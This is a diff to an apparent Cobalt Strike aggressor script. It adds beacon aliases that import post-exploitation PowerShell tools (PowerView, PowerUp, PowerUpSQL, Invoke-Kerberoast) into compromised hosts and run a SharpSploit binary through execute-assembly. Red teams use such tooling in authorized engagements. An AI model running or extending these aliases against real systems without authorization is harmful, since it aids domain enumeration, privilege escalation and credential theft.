@@ -9,25 +9,42 @@
 #     beacon> load_powerview
 #     beacon> load_powerup
 #     beacon> load_powerupsql
+#     beacon> whoami
 
 ### Output ###
 # powershell-import task gets exected
 
 ### Global variables section
-global('$powerview_path $powerup_path $powerupsql_path $kerberoast_path');
-
-$powerview_path  = "/root/rt/post/PowerShell/PowerView3.ps1";
-$powerup_path    = "/root/rt/post/PowerShell/PowerUp.ps1";
-$powerupsql_path = "/root/rt/post/PowerShell/PowerUpSQL/PowerUpSQL.ps1";
-$kerberoast_path = "/root/rt/post/PowerShell/Invoke-Kerberoast.ps1";
+$powerview_path  = "/root/rt/post/PowerShells/PowerView.ps1";
+$powerup_path    = "/root/rt/post/PowerShells/PowerUp.ps1";
+$powerupsql_path = "/root/rt/post/PowerShells/PowerUpSQL/PowerUpSQL.ps1";
+$kerberoast_path = "/root/rt/post/PowerShells/Invoke-Kerberoast.ps1";
+$whoami_path     = "/root/rt/post/Red-Teaming-Compiled/SharpSploit/whoami.exe";
 ### 
 
 sub load_ps_script
 {
-  binput($1, "powershell_import $2");
-	bpowershell_import($1, $2);
+    $bid    = $1;
+    $file   = $2;
+
+    binput($1, "powershell_import $file");
+	bpowershell_import($bid, $file);
 }
 
+sub load_bin_script
+{
+    $bid    = $1;
+    $file   = $2;
+    $params = $3;
+
+    binput($1, "execute-assembly $2");
+	bexecute_assembly($bid, $file, $params);
+}
+
+
+#
+# PowerShells
+#
 alias load_powerview {
 	load_ps_script($1, $powerview_path);
 }
@@ -42,4 +59,12 @@ alias load_powerupsql {
 
 alias load_kerberoast {
 	load_ps_script($1, $kerberoast_path);
+}
+
+
+#
+# Binaries
+#
+alias whoami {
+	load_bin_script($1, $whoami_path);
 }
